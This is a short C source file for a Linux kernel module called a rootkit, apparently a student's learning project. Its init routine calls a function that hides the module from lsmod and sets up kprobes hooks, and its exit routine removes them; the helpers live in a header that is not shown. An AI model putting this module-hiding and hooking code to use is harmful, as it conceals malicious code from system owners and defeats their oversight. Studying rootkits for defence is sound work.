#include "rootest.h"

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("HOOOKING");
MODULE_AUTHOR("2600 student");
MODULE_VERSION("0.0.1");

static int __init rootkit_init(void) 
{

  printk(KERN_INFO "rootkit: init\n");
  // kprobes concept
  hide_from_lsmod();
  return kprobes_init();
}

static void __exit rootkit_exit(void) 
{
  printk(KERN_INFO "rootkit: exit\n");
  kprobes_exit();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
